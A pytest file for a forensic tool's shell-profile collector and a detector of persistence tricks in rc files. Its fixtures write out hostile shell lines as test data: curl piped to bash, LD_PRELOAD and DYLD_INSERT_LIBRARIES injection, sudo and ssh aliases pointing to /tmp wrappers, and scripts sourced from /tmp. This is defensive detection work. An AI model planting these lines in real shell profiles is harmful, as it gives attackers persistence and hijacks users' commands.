"""Shell rc / profile collector + ShellProfileAuditDetector tests."""

from __future__ import annotations

from digger.collectors.common.shell_profiles import (
    ShellProfileCollector,
    _infer_shell,
)
from digger.core.evidence import Artifact, EvidenceStore
from digger.detectors.shell_profile_audit import (
    ShellProfileAuditDetector,
    _looks_writable,
)


# ---- collector helpers ---- #


def test_infer_shell_zsh():
    assert _infer_shell(".zshrc") == "zsh"
    assert _infer_shell(".zprofile") == "zsh"


def test_infer_shell_bash():
    assert _infer_shell(".bashrc") == "bash"
    assert _infer_shell(".bash_profile") == "bash"


def test_infer_shell_fish():
    assert _infer_shell("config.fish") == "fish"


def test_infer_shell_nushell():
    assert _infer_shell(".config/nu/config.nu") == "nushell"
    assert _infer_shell(".config/nushell/env.nu") == "nushell"


def test_infer_shell_falls_back_to_sh():
    assert _infer_shell(".profile") == "sh"
    assert _infer_shell("unknown") == "sh"


# ---- collector: minimal end-to-end on a fake home ---- #


def test_collector_reads_user_rc_files(tmp_path, monkeypatch):
    fake_home = tmp_path / "alice"
    fake_home.mkdir()
    (fake_home / ".bashrc").write_text(
        "# regular bashrc\nexport PS1='$ '\n",
    )
    (fake_home / ".zshrc").write_text(
        "alias ll='ls -la'\n",
    )
    fake_fish = fake_home / ".config" / "fish"
    fake_fish.mkdir(parents=True)
    (fake_fish / "config.fish").write_text(
        "set -gx PATH /usr/local/bin $PATH\n",
    )
    (fake_fish / "conf.d").mkdir()
    (fake_fish / "conf.d" / "abbr.fish").write_text(
        "abbr g git\n",
    )

    monkeypatch.setattr(
        "digger.collectors.common.shell_profiles.Path.home",
        staticmethod(lambda: fake_home),
    )
    # No system files.
    monkeypatch.setattr(
        "digger.collectors.common.shell_profiles._SYSTEM_FILES", (),
    )
    monkeypatch.setattr(
        "digger.collectors.common.shell_profiles._SYSTEM_GLOBS", (),
    )

    arts = list(ShellProfileCollector().collect())
    user_arts = [a for a in arts if "shell-rc:user" in a.subject]
    assert {a.data["path"].split("/")[-1]
            for a in user_arts} >= {".bashrc", ".zshrc",
                                     "config.fish", "abbr.fish"}


def test_collector_reads_system_rc_files(tmp_path, monkeypatch):
    fake_etc = tmp_path / "etc"
    fake_etc.mkdir()
    (fake_etc / "profile").write_text(
        "# system profile\n",
    )
    profile_d = fake_etc / "profile.d"
    profile_d.mkdir()
    (profile_d / "lang.sh").write_text(
        "export LANG=en_US.UTF-8\n",
    )

    fake_home = tmp_path / "alice"
    fake_home.mkdir()

    monkeypatch.setattr(
        "digger.collectors.common.shell_profiles.Path.home",
        staticmethod(lambda: fake_home),
    )
    monkeypatch.setattr(
        "digger.collectors.common.shell_profiles._SYSTEM_FILES",
        (str(fake_etc / "profile"),),
    )
    monkeypatch.setattr(
        "digger.collectors.common.shell_profiles._SYSTEM_GLOBS",
        (str(profile_d / "*.sh"),),
    )

    arts = list(ShellProfileCollector().collect())
    system_arts = [a for a in arts
                   if a.subject.startswith("shell-rc:system:")]
    paths = {a.data["path"] for a in system_arts}
    assert str(fake_etc / "profile") in paths
    assert str(profile_d / "lang.sh") in paths


def test_collector_skips_non_existent_files(tmp_path, monkeypatch):
    """Empty home dir + empty system list = zero artifacts, no crash."""
    fake_home = tmp_path / "alice"
    fake_home.mkdir()
    monkeypatch.setattr(
        "digger.collectors.common.shell_profiles.Path.home",
        staticmethod(lambda: fake_home),
    )
    monkeypatch.setattr(
        "digger.collectors.common.shell_profiles._SYSTEM_FILES", (),
    )
    monkeypatch.setattr(
        "digger.collectors.common.shell_profiles._SYSTEM_GLOBS", (),
    )
    arts = list(ShellProfileCollector().collect())
    assert arts == []


def test_collector_caps_huge_files(tmp_path, monkeypatch):
    """Files larger than the cap are still emitted but with truncated
    contents."""
    fake_home = tmp_path / "alice"
    fake_home.mkdir()
    huge_body = "# pad\n" + ("x" * 400_000)
    (fake_home / ".bashrc").write_text(huge_body)

    monkeypatch.setattr(
        "digger.collectors.common.shell_profiles.Path.home",
        staticmethod(lambda: fake_home),
    )
    monkeypatch.setattr(
        "digger.collectors.common.shell_profiles._SYSTEM_FILES", (),
    )
    monkeypatch.setattr(
        "digger.collectors.common.shell_profiles._SYSTEM_GLOBS", (),
    )
    arts = list(ShellProfileCollector().collect())
    bashrc = [a for a in arts
              if a.data["path"].endswith(".bashrc")][0]
    # cap is 256 KiB
    assert len(bashrc.data["contents"]) <= 256 * 1024


# ---- detector helpers ---- #


def test_looks_writable_tmp():
    assert _looks_writable("/tmp/x") is True


def test_looks_writable_home():
    assert _looks_writable("/home/alice/.local/bin") is True
    assert _looks_writable("/Users/alice/bin") is True


def test_looks_writable_relative():
    assert _looks_writable("./local-bin") is True
    assert _looks_writable("~/bin") is True
    assert _looks_writable(".") is True


def test_looks_writable_safe():
    assert _looks_writable("/usr/local/bin") is False
    assert _looks_writable("/opt/bin") is False
    assert _looks_writable("") is False


# ---- detector: seeding ---- #


def _seed(store: EvidenceStore, path: str, contents: str, *,
          scope: str = "user"):
    store.add_artifact(Artifact(
        collector="shell.profile",
        category="persistence",
        subject=f"shell-rc:{scope}:{path}",
        data={
            "path": path,
            "scope": scope,
            "shell": "bash",
            "contents": contents,
            "size": len(contents),
            "owner_uid": 1000,
            "mode": 0o644,
            "mtime": 1000.0,
            "mitre": "T1546.004",
        },
    ))


# ---- SH1 network fetch ---- #


def test_sh1_curl_high(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store, "/home/u/.bashrc",
              "# tiny config\n"
              "curl -fsSL https://example.com/install > /tmp/x\n")
        findings = list(ShellProfileAuditDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "shell_network_fetch"]
        assert len(f) == 1
        assert f[0].severity == "high"
    finally:
        store.close()


def test_sh1_pipe_to_shell_critical(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store, "/home/u/.bashrc",
              "curl https://e.com/x | bash\n")
        findings = list(ShellProfileAuditDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "shell_network_fetch"]
        assert len(f) == 1
        assert f[0].severity == "critical"
        assert f[0].evidence["pipe_to_shell"] is True
    finally:
        store.close()


def test_sh1_no_finding_for_clean_rc(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store, "/home/u/.bashrc",
              "export PS1='$ '\nalias ll='ls -la'\n")
        findings = list(ShellProfileAuditDetector().detect(store))
        assert not [x for x in findings
                    if x.evidence.get("kind") == "shell_network_fetch"]
    finally:
        store.close()


# ---- SH2 encoded payload ---- #


def test_sh2_base64_payload_medium(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store, "/home/u/.bashrc",
              "BLOB=" + ("A" * 200) + "\n")
        findings = list(ShellProfileAuditDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "shell_encoded_payload"]
        assert len(f) == 1
        assert f[0].severity == "medium"
    finally:
        store.close()


# ---- SH3 PATH prepend with writable head ---- #


def test_sh3_tmp_in_path_high(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store, "/home/u/.bashrc",
              "export PATH=/tmp/bin:$PATH\n")
        findings = list(ShellProfileAuditDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind")
             == "shell_path_writable_prepend"]
        assert len(f) == 1
        assert f[0].severity == "high"
        assert "/tmp/bin" in f[0].evidence["writable_heads"]
    finally:
        store.close()


def test_sh3_home_local_bin_in_path_high(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store, "/home/u/.bashrc",
              'export PATH="/home/u/.local/bin:$PATH"\n')
        findings = list(ShellProfileAuditDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind")
             == "shell_path_writable_prepend"]
        assert len(f) == 1
    finally:
        store.close()


def test_sh3_safe_path_no_finding(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store, "/home/u/.bashrc",
              "export PATH=/usr/local/bin:$PATH\n")
        findings = list(ShellProfileAuditDetector().detect(store))
        assert not [x for x in findings
                    if x.evidence.get("kind")
                    == "shell_path_writable_prepend"]
    finally:
        store.close()


def test_sh3_fish_path_writable_head(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store, "/home/u/.config/fish/config.fish",
              "set -gx PATH /tmp/bin $PATH\n")
        findings = list(ShellProfileAuditDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind")
             == "shell_path_writable_prepend"]
        assert len(f) == 1
    finally:
        store.close()


# ---- SH4 alias hijack ---- #


def test_sh4_alias_sudo_high(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store, "/home/u/.bashrc",
              "alias sudo='/tmp/wrapper sudo'\n")
        findings = list(ShellProfileAuditDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "shell_alias_hijack"]
        assert len(f) == 1
        assert any(h["name"] == "sudo" for h in f[0].evidence["hijacks"])
    finally:
        store.close()


def test_sh4_alias_safe_command_no_finding(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store, "/home/u/.bashrc",
              "alias ll='ls -la'\nalias gs='git status'\n")
        findings = list(ShellProfileAuditDetector().detect(store))
        assert not [x for x in findings
                    if x.evidence.get("kind") == "shell_alias_hijack"]
    finally:
        store.close()


def test_sh4_multiple_hijacks(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store, "/home/u/.bashrc",
              "alias sudo='/tmp/x sudo'\n"
              "alias ssh='/tmp/y ssh'\n"
              "alias docker='/tmp/z docker'\n")
        findings = list(ShellProfileAuditDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "shell_alias_hijack"]
        assert len(f) == 1
        names = {h["name"] for h in f[0].evidence["hijacks"]}
        assert names == {"sudo", "ssh", "docker"}
    finally:
        store.close()


# ---- SH5 trap / PROMPT_COMMAND / precmd ---- #


def test_sh5_trap_medium(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store, "/home/u/.bashrc",
              "trap 'echo command: $BASH_COMMAND' DEBUG\n")
        findings = list(ShellProfileAuditDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "shell_trap_or_prompt"]
        assert len(f) == 1
        assert "trap" in f[0].evidence["triggers"]
    finally:
        store.close()


def test_sh5_prompt_command(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store, "/home/u/.bashrc",
              "export PROMPT_COMMAND='history -a'\n")
        findings = list(ShellProfileAuditDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "shell_trap_or_prompt"]
        assert len(f) == 1
        assert "PROMPT_COMMAND" in f[0].evidence["triggers"]
    finally:
        store.close()


def test_sh5_zsh_precmd(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store, "/home/u/.zshrc",
              "precmd() { print -P '%~' }\n")
        findings = list(ShellProfileAuditDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "shell_trap_or_prompt"]
        assert len(f) == 1
        assert "precmd/preexec" in f[0].evidence["triggers"]
    finally:
        store.close()


# ---- SH6 source from writable ---- #


def test_sh6_source_tmp_high(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store, "/home/u/.bashrc",
              "source /tmp/setup.sh\n")
        findings = list(ShellProfileAuditDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "shell_source_writable"]
        assert len(f) == 1
        assert "/tmp/setup.sh" in f[0].evidence["sourced"]
    finally:
        store.close()


def test_sh6_dot_source(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store, "/home/u/.bashrc",
              ". /home/u/Downloads/install.sh\n")
        findings = list(ShellProfileAuditDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "shell_source_writable"]
        assert len(f) == 1
    finally:
        store.close()


def test_sh6_source_safe_path_no_finding(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store, "/home/u/.bashrc",
              "source /etc/bashrc\n"
              "source /usr/local/etc/profile.d/conda.sh\n")
        findings = list(ShellProfileAuditDetector().detect(store))
        assert not [x for x in findings
                    if x.evidence.get("kind") == "shell_source_writable"]
    finally:
        store.close()


# ---- SH7 LD_PRELOAD / LD_AUDIT ---- #


def test_sh7_ld_preload_critical(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store, "/home/u/.bashrc",
              "export LD_PRELOAD=/tmp/libhide.so\n")
        findings = list(ShellProfileAuditDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "shell_lib_inject"]
        assert len(f) == 1
        assert f[0].severity == "critical"
        assert f[0].evidence["injections"][0]["var"] == "LD_PRELOAD"
    finally:
        store.close()


def test_sh7_dyld_insert_libraries(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store, "/Users/u/.zshrc",
              "export DYLD_INSERT_LIBRARIES=/Users/Shared/x.dylib\n")
        findings = list(ShellProfileAuditDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "shell_lib_inject"]
        assert len(f) == 1
        assert f[0].evidence["injections"][0]["var"] == \
            "DYLD_INSERT_LIBRARIES"
    finally:
        store.close()


def test_sh7_ld_audit(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store, "/home/u/.bashrc",
              "export LD_AUDIT=/home/u/.cache/audit.so\n")
        findings = list(ShellProfileAuditDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "shell_lib_inject"]
        assert len(f) == 1
    finally:
        store.close()


# ---- stacking / scope ---- #


def test_detector_stacks_multiple_findings(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store, "/home/u/.bashrc",
              "curl https://e.com/x | bash\n"
              "alias sudo='/tmp/wrapper'\n"
              "export LD_PRELOAD=/tmp/hide.so\n")
        findings = list(ShellProfileAuditDetector().detect(store))
        kinds = {f.evidence.get("kind") for f in findings}
        assert "shell_network_fetch" in kinds
        assert "shell_alias_hijack" in kinds
        assert "shell_lib_inject" in kinds
    finally:
        store.close()


def test_detector_processes_system_scope(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store, "/etc/profile.d/x.sh",
              "curl https://e.com/x | bash\n",
              scope="system")
        findings = list(ShellProfileAuditDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "shell_network_fetch"]
        assert len(f) == 1
        assert f[0].evidence["scope"] == "system"
    finally:
        store.close()


def test_detector_returns_no_findings_on_empty_store(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        assert list(ShellProfileAuditDetector().detect(store)) == []
    finally:
        store.close()


def test_detector_ignores_non_shell_artifacts(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        store.add_artifact(Artifact(
            collector="other",
            category="persistence",
            subject="something:other",
            data={"contents": "curl x | sh"},
        ))
        assert list(ShellProfileAuditDetector().detect(store)) == []
    finally:
        store.close()


def test_detector_registered_in_all_detectors():
    from digger.detectors import all_detectors
    names = {d.name for d in all_detectors()}
    assert "shell_profile_audit" in names


def test_detector_sigma_template_has_persistence_tags():
    det = ShellProfileAuditDetector()
    tpl = det.to_sigma_template()
    assert tpl["id"] == "digger-shell-profile-audit-template"
    assert "attack.t1546.004" in tpl["tags"]
    assert "attack.t1574.006" in tpl["tags"]


def test_collector_registered():
    from digger.collectors import all_collectors
    names = {c.name for c in all_collectors()}
    assert "shell.profile" in names
